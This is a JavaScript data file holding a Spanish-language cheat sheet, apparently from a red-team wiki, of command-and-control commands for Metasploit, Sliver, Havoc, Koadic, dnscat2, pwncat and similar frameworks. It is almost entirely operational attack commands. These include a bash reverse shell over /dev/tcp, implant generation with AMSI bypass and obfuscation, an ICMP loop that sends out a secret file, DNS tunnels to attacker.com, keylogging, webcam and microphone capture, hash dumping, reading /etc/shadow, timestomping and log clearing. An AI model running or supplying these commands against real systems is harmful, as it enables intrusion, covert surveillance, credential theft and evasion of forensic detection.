// Comando y Control (C2)
window.WIKI_CHEATSHEETS_11_C2 = [
 {
  "tool": "msfconsole",
  "desc": "Consola de Metasploit (usada como C2)",
  "commands": [
   {
    "cmd": "msfconsole -q",
    "desc": "Consola sin banner"
   },
   {
    "cmd": "msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; exploit'",
    "desc": "Handler Meterpreter"
   },
   {
    "cmd": "msfconsole -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; run -j'",
    "desc": "Handler Linux"
   },
   {
    "cmd": "msfconsole -r handler.rc",
    "desc": "Resource script de handler"
   },
   {
    "cmd": "msfconsole -x 'sessions -l'",
    "desc": "Listar sesiones"
   },
   {
    "cmd": "msfconsole -x 'sessions -i 1'",
    "desc": "Interactuar con sesión"
   },
   {
    "cmd": "msfconsole -x 'sessions -k 1'",
    "desc": "Matar sesión"
   },
   {
    "cmd": "msfconsole -x 'set ExitOnSession false'",
    "desc": "No salir al perder sesión"
   },
   {
    "cmd": "msfconsole -x 'use auxiliary/server/socks_proxy; set SRVPORT 1080; run'",
    "desc": "SOCKS proxy"
   },
   {
    "cmd": "msfconsole -x 'use post/multi/manage/autoroute; set SESSION 1; run'",
    "desc": "Autoroute"
   },
   {
    "cmd": "msfconsole -x 'use exploit/multi/script/web_delivery; set TARGET 2; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST IP; run'",
    "desc": "Web delivery"
   },
   {
    "cmd": "msfconsole -x 'use auxiliary/server/browser_autopwn2; run'",
    "desc": "Browser autopwn"
   },
   {
    "cmd": "msfconsole -x 'use exploit/windows/local/persistence; set SESSION 1; run'",
    "desc": "Persistencia"
   },
   {
    "cmd": "msfconsole -x 'use post/windows/manage/migrate; set SESSION 1; set PID 4; run'",
    "desc": "Migrar proceso"
   },
   {
    "cmd": "msfconsole -x 'use post/windows/gather/smart_hashdump; set SESSION 1; run'",
    "desc": "Smart hashdump"
   }
  ]
 },
 {
  "tool": "sliver",
  "desc": "Framework C2 open source (alternativa a Cobalt Strike)",
  "commands": [
   {
    "cmd": "sliver",
    "desc": "Abrir consola interactiva"
   },
   {
    "cmd": "sliver-server",
    "desc": "Iniciar servidor"
   },
   {
    "cmd": "generate --mtls 10.10.10.5 --save /tmp/beacon.exe --os windows",
    "desc": "Generar implante mTLS"
   },
   {
    "cmd": "generate --http 10.10.10.5:80 --os linux --save /tmp/beacon",
    "desc": "Implante HTTP Linux"
   },
   {
    "cmd": "generate --mtls 10.10.10.5 --os windows --arch amd64 --save /tmp/b.exe",
    "desc": "x64 Windows"
   },
   {
    "cmd": "generate --mtls 10.10.10.5 --os windows --arch amd64 --skip-symbols",
    "desc": "Sin símbolos"
   },
   {
    "cmd": "mtls --lhost 0.0.0.0 --lport 8443",
    "desc": "Listener mTLS"
   },
   {
    "cmd": "http --lhost 0.0.0.0 --lport 80",
    "desc": "Listener HTTP"
   },
   {
    "cmd": "dns --lhost 0.0.0.0 --lport 53",
    "desc": "Listener DNS"
   },
   {
    "cmd": "https --lhost 0.0.0.0 --lport 443 --website /tmp/web",
    "desc": "Listener HTTPS con sitio"
   },
   {
    "cmd": "beacons",
    "desc": "Listar beacons"
   },
   {
    "cmd": "sessions",
    "desc": "Listar sesiones"
   },
   {
    "cmd": "use [session_id]",
    "desc": "Seleccionar sesión"
   },
   {
    "cmd": "shell",
    "desc": "Shell interactiva"
   },
   {
    "cmd": "execute --in-process whoami",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "execute-assembly /tmp/Rubeus.exe triage",
    "desc": "Ejecutar ensamblado"
   },
   {
    "cmd": "portfwd add 127.0.0.1 3389 10.10.10.5 3389",
    "desc": "Port forward"
   },
   {
    "cmd": "socks5 start",
    "desc": "Iniciar SOCKS5"
   },
   {
    "cmd": "kill [session]",
    "desc": "Matar sesión"
   },
   {
    "cmd": "generate --mtls IP --os windows --arch amd64 --disable-amsi --save /tmp/b.exe",
    "desc": "Desactivar AMSI"
   },
   {
    "cmd": "generate --mtls IP --os windows --obfuscate --save /tmp/b.exe",
    "desc": "Obfuscación"
   },
   {
    "cmd": "pivot add --session S --bind 0.0.0.0:9898",
    "desc": "Pivot"
   },
   {
    "cmd": "download /etc/passwd",
    "desc": "Descargar archivo"
   },
   {
    "cmd": "upload /tmp/file.txt /tmp/",
    "desc": "Subir archivo"
   },
   {
    "cmd": "process list",
    "desc": "Listar procesos"
   },
   {
    "cmd": "ps --filter chrome",
    "desc": "Filtrar procesos"
   },
   {
    "cmd": "registry read HKLM\\\\Software\\\\...",
    "desc": "Leer registro"
   },
   {
    "cmd": "winprivs",
    "desc": "Privilegios Windows"
   }
  ]
 },
 {
  "tool": "havoc",
  "desc": "Framework C2 moderno (Demon agent, GUI)",
  "commands": [
   {
    "cmd": "./teamserver server --profile ../profiles/havoc.yaotl --port 40000",
    "desc": "Iniciar teamserver"
   },
   {
    "cmd": "./havoc client",
    "desc": "Abrir cliente GUI"
   },
   {
    "cmd": "./teamserver server --profile profile.yml --port 40000 --host 0.0.0.0",
    "desc": "Con host"
   },
   {
    "cmd": "demon> shell whoami",
    "desc": "Shell remota"
   },
   {
    "cmd": "demon> sleep 10",
    "desc": "Cambiar sleep"
   },
   {
    "cmd": "demon> sleep-mask",
    "desc": "Obfuscar memoria en sleep"
   },
   {
    "cmd": "demon> bypass-amsi",
    "desc": "Bypass AMSI"
   },
   {
    "cmd": "demon> bypass-etw",
    "desc": "Bypass ETW"
   },
   {
    "cmd": "demon> inject 1234 shellcode.bin",
    "desc": "Inyectar shellcode"
   },
   {
    "cmd": "demon> upload /tmp/file",
    "desc": "Subir archivo"
   },
   {
    "cmd": "demon> download C:\\\\Windows\\\\system.ini",
    "desc": "Descargar"
   },
   {
    "cmd": "demon> keylog",
    "desc": "Keylogger"
   },
   {
    "cmd": "demon> screencap",
    "desc": "Captura de pantalla"
   },
   {
    "cmd": "demon> spawndll /tmp/dll.dll",
    "desc": "Spawn DLL"
   },
   {
    "cmd": "demon> exit",
    "desc": "Salir"
   }
  ]
 },
 {
  "tool": "mythic",
  "desc": "Framework C2 multiplataforma (Docker-based)",
  "commands": [
   {
    "cmd": "./mythic-cli start",
    "desc": "Iniciar Mythic"
   },
   {
    "cmd": "./mythic-cli stop",
    "desc": "Parar Mythic"
   },
   {
    "cmd": "./mythic-cli status",
    "desc": "Estado"
   },
   {
    "cmd": "./mythic-cli agent install apollo",
    "desc": "Instalar agente Apollo"
   },
   {
    "cmd": "./mythic-cli agent install nimplant",
    "desc": "Instalar Nimplant"
   },
   {
    "cmd": "./mythic-cli agent list",
    "desc": "Listar agentes"
   },
   {
    "cmd": "./mythic-cli c2 install http",
    "desc": "Instalar C2 profile"
   },
   {
    "cmd": "./mythic-cli logs",
    "desc": "Logs"
   },
   {
    "cmd": "./mythic-cli update",
    "desc": "Actualizar"
   },
   {
    "cmd": "./mythic-cli restart",
    "desc": "Reiniciar"
   }
  ]
 },
 {
  "tool": "caldera",
  "desc": "Plataforma de emulación de adversarios (MITRE ATT&CK)",
  "commands": [
   {
    "cmd": "./server.py",
    "desc": "Iniciar servidor (puerto 8888)"
   },
   {
    "cmd": "./server.py --fresh",
    "desc": "Base de datos nueva"
   },
   {
    "cmd": "./server.py --insecure",
    "desc": "Sin TLS"
   },
   {
    "cmd": "./server.py --port 8080",
    "desc": "Puerto custom"
   },
   {
    "cmd": "./server.py --stop",
    "desc": "Parar"
   },
   {
    "cmd": "./server.py --restart",
    "desc": "Reiniciar"
   },
   {
    "cmd": "python3 agent.py -c http://10.0.0.1:8888",
    "desc": "Agente"
   },
   {
    "cmd": "python3 sandcat.py -server http://10.0.0.1:8888",
    "desc": "Sandcat"
   }
  ]
 },
 {
  "tool": "adaptixc2",
  "desc": "Framework C2 con GUI y agentes avanzados",
  "commands": [
   {
    "cmd": "adaptixserver -c config.yaml",
    "desc": "Iniciar servidor C2"
   },
   {
    "cmd": "adaptixserver --help",
    "desc": "Ayuda"
   },
   {
    "cmd": "adaptixclient",
    "desc": "Cliente GUI"
   }
  ]
 },
 {
  "tool": "covenant",
  "desc": "Framework C2 .NET para Windows",
  "commands": [
   {
    "cmd": "covenant",
    "desc": "Iniciar servidor"
   },
   {
    "cmd": "covenant --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "merlin",
  "desc": "C2 post-explotación escrito en Go",
  "commands": [
   {
    "cmd": "./merlinServer -i 10.0.0.1 -p 443",
    "desc": "Iniciar servidor"
   },
   {
    "cmd": "./merlinServer -i 10.0.0.1 -p 443 -s",
    "desc": "Con TLS"
   },
   {
    "cmd": "./merlinServer -i IP -p 443 -l log.txt",
    "desc": "Con log"
   },
   {
    "cmd": "./merlinAgent -url https://IP:443",
    "desc": "Agente"
   },
   {
    "cmd": "./merlinAgent -url http://IP:80 -psk secret",
    "desc": "Con PSK"
   },
   {
    "cmd": "merlin> agents",
    "desc": "Listar agentes"
   },
   {
    "cmd": "merlin> interact agent-id",
    "desc": "Interactuar"
   },
   {
    "cmd": "merlin> shell whoami",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "merlin> socks start 1080",
    "desc": "SOCKS"
   },
   {
    "cmd": "merlin> upload file",
    "desc": "Subir"
   }
  ]
 },
 {
  "tool": "pupy",
  "desc": "C2 multiplataforma con muchos post-modules",
  "commands": [
   {
    "cmd": "pupysh",
    "desc": "Iniciar consola"
   },
   {
    "cmd": "pupysh --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "villain",
  "desc": "C2 con Windows/Linux shells (evasión AMSI)",
  "commands": [
   {
    "cmd": "villain --help",
    "desc": "Ayuda"
   },
   {
    "cmd": "villain --host IP",
    "desc": "Bind IP"
   },
   {
    "cmd": "villain --port 4444",
    "desc": "Puerto"
   },
   {
    "cmd": "villain --multi-command",
    "desc": "Multi comando"
   },
   {
    "cmd": "villain --secure",
    "desc": "SSL"
   },
   {
    "cmd": "villain --interactive",
    "desc": "Interactivo"
   }
  ]
 },
 {
  "tool": "pwncat-c2",
  "desc": "C2 con implantes y gestión de sesiones (PwnCat)",
  "commands": [
   {
    "cmd": "pwncat-c2",
    "desc": "Servidor C2"
   },
   {
    "cmd": "pwncat-c2 -l -p 4444",
    "desc": "Listener"
   },
   {
    "cmd": "pwncat-c2 -l -p 4444 --platform linux",
    "desc": "Plataforma"
   },
   {
    "cmd": "pwncat-c2 -l -p 4444 --platform windows",
    "desc": "Windows"
   },
   {
    "cmd": "pwncat-c2 -l -p 4444 --platform powershell",
    "desc": "PowerShell"
   },
   {
    "cmd": "pwncat-c2 -l -p 4444 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "pwncat-c2 -l -p 4444 --log log.txt",
    "desc": "Log"
   },
   {
    "cmd": "pwncat-c2 -l -p 4444 -s",
    "desc": "Shellcode"
   },
   {
    "cmd": "pwncat-c2 -l -p 4444 -c",
    "desc": "Comando"
   },
   {
    "cmd": "pwncat-c2 -l -p 4444 --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "powerhub",
  "desc": "C2 basado en PowerShell vía web",
  "commands": [
   {
    "cmd": "powerhub",
    "desc": "Iniciar"
   },
   {
    "cmd": "powerhub --port 8080",
    "desc": "Puerto"
   },
   {
    "cmd": "powerhub --auth-token token",
    "desc": "Token"
   },
   {
    "cmd": "powerhub --force-https",
    "desc": "HTTPS"
   },
   {
    "cmd": "powerhub --cert cert.pem --key key.pem",
    "desc": "Cert"
   },
   {
    "cmd": "powerhub --no-obfuscation",
    "desc": "Sin ofuscación"
   },
   {
    "cmd": "powerhub --web-bind 0.0.0.0",
    "desc": "Bind"
   },
   {
    "cmd": "powerhub --debug",
    "desc": "Debug"
   },
   {
    "cmd": "powerhub --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "koadic",
  "desc": "C2 de post-explotación Windows (JavaScript)",
  "commands": [
   {
    "cmd": "koadic",
    "desc": "Iniciar C2"
   },
   {
    "cmd": "koadic -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "koadic> use stager/js/mshta",
    "desc": "Usar stager MSHTA"
   },
   {
    "cmd": "koadic> set SRVHOST 0.0.0.0",
    "desc": "Host"
   },
   {
    "cmd": "koadic> set SRVPORT 9999",
    "desc": "Puerto"
   },
   {
    "cmd": "koadic> set PAYLOAD windows/meterpreter",
    "desc": "Payload"
   },
   {
    "cmd": "koadic> run",
    "desc": "Ejecutar stager"
   },
   {
    "cmd": "koadic> jobs",
    "desc": "Ver jobs"
   },
   {
    "cmd": "koadic> sessions",
    "desc": "Sesiones"
   },
   {
    "cmd": "koadic> interact 0",
    "desc": "Interactuar"
   },
   {
    "cmd": "koadic> use module privesc/ms16_032",
    "desc": "Privesc module"
   },
   {
    "cmd": "koadic> use module persistence/registry",
    "desc": "Persistencia"
   },
   {
    "cmd": "koadic> use module post/mimikatz",
    "desc": "Mimikatz"
   },
   {
    "cmd": "koadic> use module post/keylogger",
    "desc": "Keylogger"
   },
   {
    "cmd": "koadic> use module post/screenshot",
    "desc": "Screenshot"
   },
   {
    "cmd": "koadic> use module post/download",
    "desc": "Descargar"
   },
   {
    "cmd": "koadic> use module post/upload",
    "desc": "Subir"
   },
   {
    "cmd": "koadic> use module post/exec_command",
    "desc": "Ejecutar"
   },
   {
    "cmd": "koadic> use module post/get_env",
    "desc": "Env"
   },
   {
    "cmd": "koadic> use module recon/portscan",
    "desc": "Portscan"
   }
  ]
 },
 {
  "tool": "c2-mythic-agents",
  "desc": "Agentes y operaciones de Mythic C2",
  "commands": [
   {
    "cmd": "./mythic-cli agent install apollo --debug",
    "desc": "Instalar Apollo debug"
   },
   {
    "cmd": "./mythic-cli agent install nimplant --debug",
    "desc": "Instalar Nimplant"
   },
   {
    "cmd": "./mythic-cli agent remove apollo",
    "desc": "Quitar agente"
   },
   {
    "cmd": "./mythic-cli c2 install http --debug",
    "desc": "C2 HTTP"
   },
   {
    "cmd": "./mythic-cli c2 install tcp --debug",
    "desc": "C2 TCP"
   },
   {
    "cmd": "./mythic-cli payload generate apollo windows --x64",
    "desc": "Generar payload"
   },
   {
    "cmd": "./mythic-cli payload generate nimplant linux --x64",
    "desc": "Payload Linux"
   },
   {
    "cmd": "./mythic-cli db migrate",
    "desc": "Migrar DB"
   },
   {
    "cmd": "./mythic-cli logs --level DEBUG",
    "desc": "Logs debug"
   },
   {
    "cmd": "./mythic-cli stop --all",
    "desc": "Parar todo"
   }
  ]
 },
 {
  "tool": "msf-c2",
  "desc": "Metasploit como C2 (variantes de listener)",
  "commands": [
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; run'",
    "desc": "Handler x64"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; run'",
    "desc": "Handler linux"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; set ExitOnSession false; run -j'",
    "desc": "Handler PHP"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST IP; set LPORT 443; set ExitOnSession false; run -j'",
    "desc": "HTTPS"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_dns; set LHOST IP; set LPORT 53; run'",
    "desc": "DNS"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST IP; run'",
    "desc": "Java"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/capture/http_basic; set SRVHOST IP; run -j'",
    "desc": "Capturar creds HTTP"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/capture/smtp; set SRVHOST IP; run -j'",
    "desc": "Capturar SMTP"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/capture/ftp; set SRVHOST IP; run -j'",
    "desc": "Capturar FTP"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 9050; run -j'",
    "desc": "SOCKS proxy"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS IP; run'",
    "desc": "Portscan desde msf"
   },
   {
    "cmd": "msfconsole -q -x 'use post/multi/manage/autoroute; set SESSION 1; run'",
    "desc": "Autoroute"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/msf_icmp; set LHOST IP; run -j'",
    "desc": "ICMP C2"
   },
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/msf_tftp; set LHOST IP; run -j'",
    "desc": "TFTP"
   },
   {
    "cmd": "msfconsole -q -x 'load alias; alias psexec use exploit/windows/smb/psexec'",
    "desc": "Alias"
   },
   {
    "cmd": "msfconsole -q -x 'sessions -l'",
    "desc": "Listar sesiones"
   },
   {
    "cmd": "msfconsole -q -x 'sessions -C sysinfo'",
    "desc": "Info todas"
   },
   {
    "cmd": "msfconsole -q -x 'sessions -i 1'",
    "desc": "Entrar a sesión"
   }
  ]
 },
 {
  "tool": "caldera-extra",
  "desc": "Caldera (framework C2 autónomo)",
  "commands": [
   {
    "cmd": "caldera",
    "desc": "Iniciar server"
   },
   {
    "cmd": "caldera --insecure",
    "desc": "Sin SSL"
   },
   {
    "cmd": "caldera --fresh",
    "desc": "Base nueva"
   },
   {
    "cmd": "curl -s http://IP:8888",
    "desc": "Dashboard"
   },
   {
    "cmd": "curl -s -X POST http://IP:8888/api/rest -H 'KEY: admin'",
    "desc": "API"
   },
   {
    "cmd": "curl -s http://IP:8888/api/agents -H 'KEY: admin'",
    "desc": "Agentes"
   },
   {
    "cmd": "curl -s http://IP:8888/api/adversaries -H 'KEY: admin'",
    "desc": "Adversarios"
   },
   {
    "cmd": "python3 -c 'import requests; print(requests.get(\"http://IP:8888/api/facts\", headers={\"KEY\":\"admin\"}).text)'",
    "desc": "Facts"
   },
   {
    "cmd": "docker run -p 8888:8888 caldera",
    "desc": "Docker"
   },
   {
    "cmd": "ls /usr/share/caldera/conf/",
    "desc": "Config"
   },
   {
    "cmd": "cat /usr/share/caldera/conf/default.yml",
    "desc": "YML config"
   }
  ]
 },
 {
  "tool": "meterpreter-extra",
  "desc": "Comandos avanzados de Meterpreter",
  "commands": [
   {
    "cmd": "meterpreter> help",
    "desc": "Ayuda"
   },
   {
    "cmd": "meterpreter> background",
    "desc": "Fondo"
   },
   {
    "cmd": "meterpreter> sessions -i 1",
    "desc": "Volver"
   },
   {
    "cmd": "meterpreter> sysinfo",
    "desc": "Info"
   },
   {
    "cmd": "meterpreter> getuid",
    "desc": "UID"
   },
   {
    "cmd": "meterpreter> getprivs",
    "desc": "Privilegios"
   },
   {
    "cmd": "meterpreter> hashdump",
    "desc": "Dump hashes"
   },
   {
    "cmd": "meterpreter> upload /tmp/x.exe C:\\\\x.exe",
    "desc": "Subir"
   },
   {
    "cmd": "meterpreter> download C:\\\\x.txt /tmp/",
    "desc": "Bajar"
   },
   {
    "cmd": "meterpreter> search -f *.conf",
    "desc": "Buscar"
   },
   {
    "cmd": "meterpreter> search -d C:\\\\ -f '*.txt'",
    "desc": "Buscar dir"
   },
   {
    "cmd": "meterpreter> screenshare",
    "desc": "Compartir pantalla"
   },
   {
    "cmd": "meterpreter> record_mic -d 10",
    "desc": "Grabar mic"
   },
   {
    "cmd": "meterpreter> webcam_list && webcam_snap",
    "desc": "Webcam"
   },
   {
    "cmd": "meterpreter> keyscan_start && keyscan_dump",
    "desc": "Keylogger"
   },
   {
    "cmd": "meterpreter> timestomp C:\\\\x.exe -v '01/01/2026 00:00:00'",
    "desc": "Timestomp"
   },
   {
    "cmd": "meterpreter> clearev",
    "desc": "Limpiar logs"
   },
   {
    "cmd": "meterpreter> shell",
    "desc": "Shell"
   },
   {
    "cmd": "meterpreter> portfwd add -L 127.0.0.1 -l 8080 -p 80 -r IP",
    "desc": "Portfwd"
   },
   {
    "cmd": "meterpreter> run post/multi/recon/local_exploit_suggester",
    "desc": "Sugerir exploits"
   }
  ]
 },
 {
  "tool": "sliver-extra",
  "desc": "Sliver C2 (variantes)",
  "commands": [
   {
    "cmd": "sliver-server",
    "desc": "Iniciar"
   },
   {
    "cmd": "sliver-server unpack",
    "desc": "Desempaquetar"
   },
   {
    "cmd": "sliver> generate --mtls IP:8888 --os windows --arch amd64 -e",
    "desc": "Generar exe"
   },
   {
    "cmd": "sliver> generate --http IP:80 --os linux -e",
    "desc": "HTTP beacon"
   },
   {
    "cmd": "sliver> generate --dns IP:53 --os macos -e",
    "desc": "DNS beacon"
   },
   {
    "cmd": "sliver> mtls --lhost IP --lport 8888",
    "desc": "Listener MTLS"
   },
   {
    "cmd": "sliver> http --lhost IP --lport 80",
    "desc": "Listener HTTP"
   },
   {
    "cmd": "sliver> dns --lhost IP --lport 53",
    "desc": "Listener DNS"
   },
   {
    "cmd": "sliver> sessions",
    "desc": "Sesiones"
   },
   {
    "cmd": "sliver> use SESSION",
    "desc": "Usar"
   },
   {
    "cmd": "sliver> info",
    "desc": "Info"
   },
   {
    "cmd": "sliver> whoami",
    "desc": "Usuario"
   },
   {
    "cmd": "sliver> portscan -i 10.0.0.0/24",
    "desc": "Portscan"
   },
   {
    "cmd": "sliver> socks5 start",
    "desc": "SOCKS5"
   },
   {
    "cmd": "sliver> portfwd add -b 127.0.0.1:8888 -r IP:445",
    "desc": "Portfwd"
   },
   {
    "cmd": "sliver> download /etc/passwd",
    "desc": "Bajar"
   },
   {
    "cmd": "sliver> upload /tmp/x",
    "desc": "Subir"
   },
   {
    "cmd": "sliver> kill",
    "desc": "Matar sesión"
   }
  ]
 },
 {
  "tool": "dnscat2-extra",
  "desc": "C2 sobre DNS (dnscat2)",
  "commands": [
   {
    "cmd": "ruby dnscat2.rb --dns 'server 0.0.0.0,port=53'",
    "desc": "Servidor"
   },
   {
    "cmd": "ruby dnscat2.rb --dns 'server 0.0.0.0,port=53' --no-cache",
    "desc": "Sin cache"
   },
   {
    "cmd": "./dnscat --dns server=IP,port=53",
    "desc": "Cliente"
   },
   {
    "cmd": "./dnscat --dns server=IP --secret=SECRET",
    "desc": "Con secreto"
   },
   {
    "cmd": "dnscat2> new session",
    "desc": "Nueva sesión"
   },
   {
    "cmd": "dnscat2> sessions",
    "desc": "Listar"
   },
   {
    "cmd": "dnscat2> session -i 1",
    "desc": "Entrar"
   },
   {
    "cmd": "dnscat2> exec whoami",
    "desc": "Exec"
   },
   {
    "cmd": "dnscat2> shell",
    "desc": "Shell"
   },
   {
    "cmd": "dnscat2> download /etc/shadow",
    "desc": "Bajar"
   },
   {
    "cmd": "dnscat2> upload /tmp/x /tmp/x",
    "desc": "Subir"
   },
   {
    "cmd": "dnscat2> kill 1",
    "desc": "Matar"
   },
   {
    "cmd": "dnscat2> window",
    "desc": "Windows"
   },
   {
    "cmd": "dnscat2> quit",
    "desc": "Salir"
   }
  ]
 },
 {
  "tool": "pwncat-c2",
  "desc": "Pwncat (C2 sobre reverse shells)",
  "commands": [
   {
    "cmd": "pwncat-c2 --listen 0.0.0.0:4444",
    "desc": "Listener"
   },
   {
    "cmd": "pwncat-c2 --listen 4444 --self-connect",
    "desc": "Self"
   },
   {
    "cmd": "pwncat-c2 --listen 4444 --immediate",
    "desc": "Inmediato"
   },
   {
    "cmd": "pwncat-c2 --listen 4444 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "pwncat-c2 --listen 4444 --config config.yml",
    "desc": "Config"
   },
   {
    "cmd": "pwncat> help",
    "desc": "Ayuda"
   },
   {
    "cmd": "pwncat> back",
    "desc": "Background"
   },
   {
    "cmd": "pwncat> connect 4444",
    "desc": "Reconectar"
   },
   {
    "cmd": "pwncat> upload /tmp/x",
    "desc": "Subir"
   },
   {
    "cmd": "pwncat> download /etc/passwd",
    "desc": "Bajar"
   },
   {
    "cmd": "pwncat> enumerate",
    "desc": "Enumerar"
   },
   {
    "cmd": "pwncat> privesc",
    "desc": "Privesc"
   },
   {
    "cmd": "pwncat> persist",
    "desc": "Persistencia"
   },
   {
    "cmd": "pwncat> run 'id'",
    "desc": "Ejecutar"
   },
   {
    "cmd": "pwncat> terminate",
    "desc": "Terminar"
   }
  ]
 },
 {
  "tool": "shells-listeners",
  "desc": "Listeners y shells (variantes)",
  "commands": [
   {
    "cmd": "nc -lvnp 4444",
    "desc": "NC listen"
   },
   {
    "cmd": "nc -lvnp 4444 -k",
    "desc": "Keep"
   },
   {
    "cmd": "ncat -lvnp 4444 --ssl",
    "desc": "Ncat ssl"
   },
   {
    "cmd": "ncat -lvnp 4444 --keep-open",
    "desc": "Ncat open"
   },
   {
    "cmd": "ncat -lvnp 4444 --allow IP",
    "desc": "Permitir"
   },
   {
    "cmd": "socat TCP-LISTEN:4444,fork EXEC:/bin/bash",
    "desc": "Socat bash"
   },
   {
    "cmd": "socat TCP-LISTEN:4444,fork,reuseaddr -",
    "desc": "Socat raw"
   },
   {
    "cmd": "socat OPENSSL-LISTEN:443,cert=/tmp/c.pem,verify=0,fork EXEC:/bin/bash",
    "desc": "Socat ssl"
   },
   {
    "cmd": "socat -d -d TCP-LISTEN:4444,fork EXEC:/bin/bash",
    "desc": "Debug"
   },
   {
    "cmd": "rlwrap nc -lvnp 4444",
    "desc": "RLwrap"
   },
   {
    "cmd": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST IP; run'",
    "desc": "MSF handler"
   },
   {
    "cmd": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\"])'",
    "desc": "Py bind"
   },
   {
    "cmd": "openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/k.pem -out /tmp/c.pem -days 365",
    "desc": "Gen cert"
   },
   {
    "cmd": "ssh -R 4444:localhost:4444 user@IP",
    "desc": "Remote fwd"
   },
   {
    "cmd": "bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'",
    "desc": "Bash reverse"
   }
  ]
 },
 {
  "tool": "http-tunnels",
  "desc": "Túneles HTTP (chisel, socat, ssh)",
  "commands": [
   {
    "cmd": "chisel server -p 8080 --reverse",
    "desc": "Chisel server"
   },
   {
    "cmd": "chisel client IP:8080 R:4444:localhost:22",
    "desc": "Chisel client"
   },
   {
    "cmd": "chisel client IP:8080 R:80:localhost:80",
    "desc": "HTTP fwd"
   },
   {
    "cmd": "chisel client IP:8080 L:9000:target:80",
    "desc": "Local fwd"
   },
   {
    "cmd": "chisel server -p 8080 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "ssh -D 1080 user@IP",
    "desc": "SOCKS"
   },
   {
    "cmd": "ssh -L 8080:target:80 user@IP",
    "desc": "Local"
   },
   {
    "cmd": "ssh -R 4444:localhost:4444 user@IP",
    "desc": "Remote"
   },
   {
    "cmd": "socat TCP-LISTEN:8080,fork TCP:target:80",
    "desc": "Socat fwd"
   },
   {
    "cmd": "socat TCP-LISTEN:2222,fork TCP:target:22",
    "desc": "SSH fwd"
   },
   {
    "cmd": "ssh -o ProxyCommand='nc -X connect -x proxy:8080 %h %p' user@target",
    "desc": "ProxyCommand"
   },
   {
    "cmd": "python3 -c 'import pwn'",
    "desc": "Chisel py"
   },
   {
    "cmd": "stunnel -c -r target:443",
    "desc": "Stunnel"
   },
   {
    "cmd": "gost -L tcp://:8080/target:80",
    "desc": "Gost"
   },
   {
    "cmd": "gost -L socks5://:1080",
    "desc": "Gost socks"
   }
  ]
 },
 {
  "tool": "icmp-c2",
  "desc": "C2 sobre ICMP y covert channels",
  "commands": [
   {
    "cmd": "msfconsole -q -x 'use auxiliary/server/msf_icmp; set LHOST IP; run -j'",
    "desc": "MSF icmp"
   },
   {
    "cmd": "ping -p '736563726574' -c 1 IP",
    "desc": "Ping data"
   },
   {
    "cmd": "xxd -p /tmp/secret | tr -d '\\n' | fold -w 16",
    "desc": "Hex chunks"
   },
   {
    "cmd": "for h in $(xxd -p /tmp/secret | tr -d '\\n' | fold -w 16); do ping -p $h -c 1 IP; done",
    "desc": "Loop"
   },
   {
    "cmd": "tcpdump -i eth0 icmp -w /tmp/icmp.pcap",
    "desc": "Capturar"
   },
   {
    "cmd": "tshark -r /tmp/icmp.pcap -Y 'icmp.type==8' -T fields -e data.data",
    "desc": "Extraer"
   },
   {
    "cmd": "nping --icmp --data-string 'SECRET' IP",
    "desc": "Nping"
   },
   {
    "cmd": "ptunnel -p IP -lp 8080 -da target -dp 22",
    "desc": "Ptunnel"
   },
   {
    "cmd": "icmpsh -s IP",
    "desc": "Icmpsh server"
   },
   {
    "cmd": "icmpsh-m",
    "desc": "Icmpsh client"
   },
   {
    "cmd": "nmap -Pn -sI IP target -p 22",
    "desc": "Idle scan"
   },
   {
    "cmd": "dns2tcp -r -z -d attacker.com -c conf",
    "desc": "Dns2tcp"
   },
   {
    "cmd": "iodine -f 10.0.0.1 attacker.com",
    "desc": "Iodine"
   },
   {
    "cmd": "echo 'payload' | nc -u -w1 IP 53",
    "desc": "UDP 53"
   }
  ]
 }
];
